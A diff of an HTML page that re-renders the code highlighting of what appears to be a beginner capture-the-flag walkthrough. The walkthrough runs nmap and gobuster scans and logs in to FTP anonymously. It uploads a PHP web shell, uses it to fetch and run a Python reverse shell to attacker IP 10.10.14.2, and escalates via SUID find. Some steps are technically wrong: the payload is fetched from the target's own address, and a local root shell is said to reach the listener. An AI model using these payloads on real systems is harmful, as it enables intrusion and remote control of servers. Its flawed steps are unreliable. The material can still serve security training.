@@ -130,8 +130,8 @@
 <p>Now that we know the target's IP, we need to figure out what services are running on it. This is like knocking on doors and seeing who answers.</p>
 <h3>Port Scanning</h3>
 <p>We'll start by scanning the common ports to see what's open. A popular tool for this is Nmap.</p>
-<pre class="codehilite"><code class="language-bash">nmap -sC -sV -p- 10.10.10.10
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -142,16 +142,16 @@
 <li><strong><code>10.10.10.10</code></strong>: This is the IP address of our target machine.</li>
 </ul>
 <p>Let's imagine Nmap gives us the following output:</p>
-<pre class="codehilite"><code>Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-27 10:00 UTC
-Nmap scan report for 10.10.10.10
-Host is up (0.050s latency).
-Not shown: 65532 closed tcp ports (reset)
-PORT     STATE SERVICE VERSION
-21/tcp   open  ftp     vsftpd 3.0.3
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
-443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">92</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2023-10-27</span><span class="w"> </span><span class="nt">10</span><span class="p">:</span><span class="nd">00</span><span class="w"> </span><span class="nt">UTC</span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span>
+<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">050s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span>
+<span class="nt">Not</span><span class="w"> </span><span class="nt">shown</span><span class="o">:</span><span class="w"> </span><span class="nt">65532</span><span class="w"> </span><span class="nt">closed</span><span class="w"> </span><span class="nt">tcp</span><span class="w"> </span><span class="nt">ports</span><span class="w"> </span><span class="o">(</span><span class="nt">reset</span><span class="o">)</span>
+<span class="nt">PORT</span><span class="w">     </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span>
+<span class="nt">21</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">ftp</span><span class="w">     </span><span class="nt">vsftpd</span><span class="w"> </span><span class="nt">3</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">3</span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">6p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu0</span><span class="p">.</span><span class="nc">3</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
+<span class="nt">443</span><span class="o">/</span><span class="nt">tcp</span><span class="w">  </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssl</span><span class="o">/</span><span class="nt">http</span><span class="w"> </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -163,8 +163,8 @@ PORT     STATE SERVICE VERSION
 </ul>
 <h3>Web Server Enumeration</h3>
 <p>Since we found a web server on port 80, let's explore it. We'll use a tool called <code>gobuster</code> (or <code>ffuf</code>, which is very similar) to try and discover hidden directories and files on the web server.</p>
-<pre class="codehilite"><code class="language-bash">gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,bak
-</code></pre>
+<div class="codehilite"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://10.10.10.10<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>php,txt,html,js,bak
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -174,12 +174,12 @@ PORT     STATE SERVICE VERSION
 <li><strong><code>-x php,txt,html,js,bak</code></strong>: This option tells Gobuster to only look for files with these specific extensions. We're including common web file extensions (<code>.php</code>, <code>.html</code>, <code>.js</code>) and also looking for backup files (<code>.bak</code>) which might contain sensitive information.</li>
 </ul>
 <p>Let's assume Gobuster finds something interesting:</p>
-<pre class="codehilite"><code>/api              (Status: 200) [Size: 1500]
-/admin            (Status: 301) [---&gt; /admin/]
-/blog             (Status: 301) [---&gt; /blog/]
-/api/users        (Status: 200) [Size: 120]
-/backup.php.bak   (Status: 200) [Size: 500]
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">api</span><span class="w">              </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="o">:</span><span class="w"> </span><span class="mi">1500</span><span class="p">]</span>
+<span class="o">/</span><span class="n">admin</span><span class="w">            </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="o">---&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">blog</span><span class="w">             </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">301</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="o">---&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="p">]</span>
+<span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">users</span><span class="w">        </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="o">:</span><span class="w"> </span><span class="mi">120</span><span class="p">]</span>
+<span class="o">/</span><span class="n">backup</span><span class="p">.</span><span class="n">php</span><span class="p">.</span><span class="n">bak</span><span class="w">   </span><span class="p">(</span><span class="n">Status</span><span class="o">:</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">Size</span><span class="o">:</span><span class="w"> </span><span class="mi">500</span><span class="p">]</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -192,13 +192,13 @@ PORT     STATE SERVICE VERSION
 <h3>API Enumeration (Deeper Dive)</h3>
 <p>We discovered an <code>/api</code> directory and a <code>/api/users</code> endpoint. Let's examine the API documentation we found earlier to understand how it works.</p>
 <p>The documentation states:</p>
-<pre class="codehilite"><code># API V1 Documentation
+<div class="codehilite"><pre><span></span><code><span class="gh">#</span> API V1 Documentation
 
-&gt; **Version**: 1.0.0
-&gt; **Status**: Stable
+<span class="k">&gt; </span><span class="ge">**Version**: 1.0.0</span>
+<span class="k">&gt; </span><span class="ge">**Status**: Stable</span>
 
-## Endpoints
-### GET /users
+<span class="gu">##</span> Endpoints
+<span class="gu">##</span># GET /users
 Returns a list of users.
 
 **Response**:
@@ -206,19 +206,19 @@ Returns a list of users.
 [
   { &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot; }
 ]
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>**🧠 Beginner Analysis**
+<div class="codehilite"><pre><span></span><code><span class="o">**</span><span class="err">🧠</span><span class="w"> </span><span class="n">Beginner</span><span class="w"> </span><span class="n">Analysis</span><span class="o">**</span>
 
-*   **API Version**: The API is documented as version `1.0.0` and is marked as `Stable`. This tells us we're dealing with a known, relatively mature version.
-*   **Endpoint: `GET /users`**: This is the crucial part. The documentation explicitly states that a `GET` request to the `/users` endpoint will return a list of users.
-*   **Response Format**: The example response shows a JSON array, where each object represents a user with an `id` and `name`.
+<span class="o">*</span><span class="w">   </span><span class="o">**</span><span class="n">API</span><span class="w"> </span><span class="n">Version</span><span class="o">**:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">API</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">documented</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="n n-Quoted">`1.0.0`</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">marked</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n n-Quoted">`Stable`</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">tells</span><span class="w"> </span><span class="n">us</span><span class="w"> </span><span class="n">we</span><span class="s1">&#39;re dealing with a known, relatively mature version.</span>
+<span class="s1">*   **Endpoint: `GET /users`**: This is the crucial part. The documentation explicitly states that a `GET` request to the `/users` endpoint will return a list of users.</span>
+<span class="s1">*   **Response Format**: The example response shows a JSON array, where each object represents a user with an `id` and `name`.</span>
 
-We can interact with this endpoint directly using `curl` or by visiting it in our browser. Let's use `curl` for a programmatic approach.
+<span class="s1">We can interact with this endpoint directly using `curl` or by visiting it in our browser. Let&#39;</span><span class="n">s</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="n n-Quoted">`curl`</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">programmatic</span><span class="w"> </span><span class="n">approach</span><span class="p">.</span>
 
-```bash
-curl http://10.10.10.10/api/users
-</code></pre>
+<span class="n n-Quoted">`</span><span class="n n-Quoted n-Quoted-Escape">``</span><span class="n n-Quoted">bash</span>
+<span class="n n-Quoted">curl http://10.10.10.10/api/users</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -226,28 +226,28 @@ curl http://10.10.10.10/api/users
 <li><strong><code>http://10.10.10.10/api/users</code></strong>: This is the URL we're sending a <code>GET</code> request to. We're requesting the <code>/users</code> endpoint from our target API.</li>
 </ul>
 <p>If successful, this command will return the same JSON output as shown in the documentation:</p>
-<pre class="codehilite"><code class="language-json">[
-  { &quot;id&quot;: 1, &quot;name&quot;: &quot;Alice&quot; }
-]
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="p">[</span>
+<span class="w">  </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Alice&quot;</span><span class="w"> </span><span class="p">}</span>
+<span class="p">]</span>
+</code></pre></div>
 
 <p>This confirms our API is functioning as documented and provides us with usernames. In a real scenario, we might find more users, which could be useful for brute-forcing login forms on the <code>/admin</code> panel, for example.</p>
 <h2>Exploitation</h2>
 <p>Now that we've enumerated services and understood some of the target's functionalities, it's time to look for ways to exploit any weaknesses we've found.</p>
 <h3>Anonymous FTP Access</h3>
 <p>Remember the FTP server on port 21 (<code>vsftpd 3.0.3</code>)? One common misconfiguration is allowing anonymous logins. Let's try to log in using the username <code>anonymous</code> and any password.</p>
-<pre class="codehilite"><code class="language-bash">ftp 10.10.10.10
-</code></pre>
+<div class="codehilite"><pre><span></span><code>ftp<span class="w"> </span><span class="m">10</span>.10.10.10
+</code></pre></div>
 
 <p>Upon connecting, we'd be prompted for a username and password. Entering <code>anonymous</code> and a blank password often works.</p>
-<pre class="codehilite"><code>Connected to 10.10.10.10.
+<div class="codehilite"><pre><span></span><code>Connected to 10.10.10.10.
 220 (vsFTPd 3.0.3)
 Name (10.10.10.10:user): anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
 ftp&gt;
-</code></pre>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -257,29 +257,29 @@ ftp&gt;
 <li><strong><code>230 Login successful.</code></strong>: Success! The FTP server allowed us to log in without any credentials. This is a critical security misconfiguration.</li>
 </ul>
 <p>Once logged in, we can list directories and upload files. Let's check the available directories:</p>
-<pre class="codehilite"><code class="language-ftp">ls
-</code></pre>
+<div class="codehilite"><pre><span></span><code>ls
+</code></pre></div>
 
 <p>Imagine we see a directory like <code>uploads</code>.</p>
-<pre class="codehilite"><code class="language-ftp">cd uploads
-ls
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">cd</span><span class="w"> </span><span class="n">uploads</span>
+<span class="n">ls</span>
+</code></pre></div>
 
 <p>Now, let's try to upload a simple web shell. A web shell is a script that we can upload to the web server, and then access via our browser to execute commands on the server.</p>
 <p>We'll create a basic PHP web shell named <code>shell.php</code>:</p>
-<pre class="codehilite"><code class="language-php">&lt;?php
-    echo &quot;&lt;h1&gt;System Command Executer&lt;/h1&gt;&quot;;
-    if(isset($_GET['cmd'])){
-        echo &quot;&lt;pre&gt;&quot;;
-        system($_GET['cmd']);
-        echo &quot;&lt;/pre&gt;&quot;;
-    }
-?&gt;
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;System Command Executer&lt;/h1&gt;&quot;</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])){</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span><span class="p">;</span>
+        <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
 
 <p>Then, we upload it using FTP:</p>
-<pre class="codehilite"><code class="language-ftp">put shell.php
-</code></pre>
+<div class="codehilite"><pre><span></span><code>put shell.php
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -289,15 +289,15 @@ ls
 <li><strong>Web Shell Concept</strong>: The PHP code we wrote is a "web shell". When we upload this to the web server (running on port 80) and access it via our browser, we can pass commands to the <code>system()</code> function. For instance, if we visit <code>http://10.10.10.10/uploads/shell.php?cmd=whoami</code>, the server will execute <code>whoami</code> and display the output. This is a direct way to execute commands on the server.</li>
 </ul>
 <p>Now, we can access our uploaded shell through the web server:</p>
-<pre class="codehilite"><code>http://10.10.10.10/uploads/shell.php?cmd=whoami
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
+</code></pre></div>
 
 <p>This should return the username of the user running the web server (e.g., <code>www-data</code>). We can now execute any command within the context of this user!</p>
 <h3>Gaining a Shell</h3>
 <p>We can use our web shell to download a more robust reverse shell. A reverse shell is a connection initiated <em>from</em> the target machine <em>back</em> to our attacker machine, giving us a more interactive command-line interface.</p>
 <p>First, we need to set up a listener on our attacker machine to receive the incoming connection. We'll use <code>netcat</code> for this.</p>
-<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
-</code></pre>
+<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -309,30 +309,30 @@ ls
 </ul>
 <p>Now, using our web shell, we'll instruct the target to download and execute a Python reverse shell script. For demonstration, let's assume our attacker IP is <code>10.10.14.2</code>.</p>
 <p>In the web shell URL, we'd put something like:</p>
-<pre class="codehilite"><code>http://10.10.10.10/uploads/shell.php?cmd=wget http://10.10.10.10/shell.py -O /tmp/shell.py; python /tmp/shell.py
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">wget</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="p">;</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span>
+</code></pre></div>
 
 <p>Or if <code>wget</code> isn't available, we might use <code>curl</code>:</p>
-<pre class="codehilite"><code>http://10.10.10.10/uploads/shell.php?cmd=curl http://10.10.10.10/shell.py -o /tmp/shell.py; python /tmp/shell.py
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">curl</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span><span class="p">;</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">py</span>
+</code></pre></div>
 
 <p>The <code>shell.py</code> script would look something like this:</p>
-<pre class="codehilite"><code class="language-python">import socket
-import subprocess
-import os
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">os</span>
 
-HOST = '10.10.14.2'  # Our attacker IP
-PORT = 4444          # The port we're listening on
+<span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.2&#39;</span>  <span class="c1"># Our attacker IP</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">4444</span>          <span class="c1"># The port we&#39;re listening on</span>
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
 
-os.dup2(s.fileno(), 0)
-os.dup2(s.fileno(), 1)
-os.dup2(s.fileno(), 2)
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="mi">2</span><span class="p">)</span>
 
-subprocess.call([&quot;/bin/bash&quot;, &quot;-i&quot;])
-</code></pre>
+<span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/bash&quot;</span><span class="p">,</span> <span class="s2">&quot;-i&quot;</span><span class="p">])</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -349,12 +349,12 @@ subprocess.call([&quot;/bin/bash&quot;, &quot;-i&quot;])
 </li>
 </ul>
 <p>Once the Python script executes on the target, our <code>netcat</code> listener should show a connection:</p>
-<pre class="codehilite"><code>Listening on [0.0.0.0] (family 0, port 4444)
-Connection received from 10.10.10.10 48870
-/bin/bash: cannot set terminal process group: Inappropriate ioctl for device
-/bin/bash: no job control in this shell
-www-data@ubuntu:/var/www/html$
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">Listening</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">[</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">]</span><span class="w"> </span><span class="p">(</span><span class="n">family</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">4444</span><span class="p">)</span>
+<span class="n">Connection</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.10</span><span class="w"> </span><span class="mi">48870</span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">terminal</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="n">group</span><span class="p">:</span><span class="w"> </span><span class="n">Inappropriate</span><span class="w"> </span><span class="n">ioctl</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">device</span>
+<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="p">:</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">job</span><span class="w"> </span><span class="n">control</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">shell</span>
+<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -365,8 +365,8 @@ www-data@ubuntu:/var/www/html$
 <p>We currently have a shell as the <code>www-data</code> user, which is a low-privileged user. Our goal is to become a more powerful user, typically <code>root</code>.</p>
 <h3>Linux Capabilities</h3>
 <p>Sometimes, Linux executables have "capabilities" set that allow them to perform actions usually reserved for the root user, even when run by a less privileged user. We can check for these using <code>getcap</code>.</p>
-<pre class="codehilite"><code class="language-bash">getcap -r / 2&gt;/dev/null
-</code></pre>
+<div class="codehilite"><pre><span></span><code>getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -374,9 +374,9 @@ www-data@ubuntu:/var/www/html$
 <li><strong><code>2&gt;/dev/null</code></strong>: This redirects any error messages (like "Permission denied") to <code>/dev/null</code>, so we only see the actual capability information.</li>
 </ul>
 <p>Let's say <code>getcap</code> outputs something like this:</p>
-<pre class="codehilite"><code>/usr/bin/python3 = cap_net_raw,cap_net_admin+ep
+<div class="codehilite"><pre><span></span><code>/usr/bin/python3 = cap_net_raw,cap_net_admin+ep
 /usr/bin/ping = cap_net_raw+ep
-</code></pre>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -389,8 +389,8 @@ www-data@ubuntu:/var/www/html$
 <h3>Finding SUID Binaries</h3>
 <p>SUID (Set User ID) bits on executables allow a user to run a program with the permissions of the file's owner, rather than their own. If a binary owned by <code>root</code> has the SUID bit set, and it's vulnerable, we can exploit it to gain root privileges.</p>
 <p>We can search for these with <code>find</code>:</p>
-<pre class="codehilite"><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null
-</code></pre>
+<div class="codehilite"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -400,12 +400,12 @@ www-data@ubuntu:/var/www/html$
 <li><strong><code>2&gt;/dev/null</code></strong>: Suppresses permission denied errors.</li>
 </ul>
 <p>Suppose this command reveals:</p>
-<pre class="codehilite"><code>/usr/bin/sudo
+<div class="codehilite"><pre><span></span><code>/usr/bin/sudo
 /usr/bin/passwd
 /usr/bin/newuidmap
 /usr/bin/newgidmap
 /usr/bin/find
-</code></pre>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -415,12 +415,12 @@ www-data@ubuntu:/var/www/html$
 <h3>Exploiting <code>find</code> SUID</h3>
 <p>GTFOBins is an excellent resource for finding SUID exploits. We can check if <code>find</code> can be used to execute commands.</p>
 <p>According to GTFOBins, <code>find</code> can be exploited by using the <code>-exec</code> option creatively.</p>
-<pre class="codehilite"><code class="language-bash">find . -exec /bin/bash \; -quit
-</code></pre>
+<div class="codehilite"><pre><span></span><code>find<span class="w"> </span>.<span class="w"> </span>-exec<span class="w"> </span>/bin/bash<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
+</code></pre></div>
 
 <p>Let's try this from our current shell:</p>
-<pre class="codehilite"><code class="language-bash">find /tmp/ -exec /bin/bash \; -quit
-</code></pre>
+<div class="codehilite"><pre><span></span><code>find<span class="w"> </span>/tmp/<span class="w"> </span>-exec<span class="w"> </span>/bin/bash<span class="w"> </span><span class="se">\;</span><span class="w"> </span>-quit
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
@@ -429,10 +429,10 @@ www-data@ubuntu:/var/www/html$
 <li><strong><code>-quit</code></strong>: This tells <code>find</code> to exit immediately after the first execution, making it faster and cleaner.</li>
 </ul>
 <p>If this command is successful, our <code>netcat</code> listener will receive a <em>new</em> connection, this time with root privileges!</p>
-<pre class="codehilite"><code>Listening on [0.0.0.0] (family 0, port 4444)
-Connection received from 10.10.10.10 49122
-root@ubuntu:/tmp#
-</code></pre>
+<div class="codehilite"><pre><span></span><code><span class="n">Listening</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="o">[</span><span class="n">0.0.0.0</span><span class="o">]</span><span class="w"> </span><span class="p">(</span><span class="n">family</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="mi">4444</span><span class="p">)</span>
+<span class="k">Connection</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mf">10.10.10.10</span><span class="w"> </span><span class="mi">49122</span>
+<span class="n">root</span><span class="nv">@ubuntu</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span>
+</code></pre></div>
 
 <p><strong>🧠 Beginner Analysis</strong></p>
 <ul>
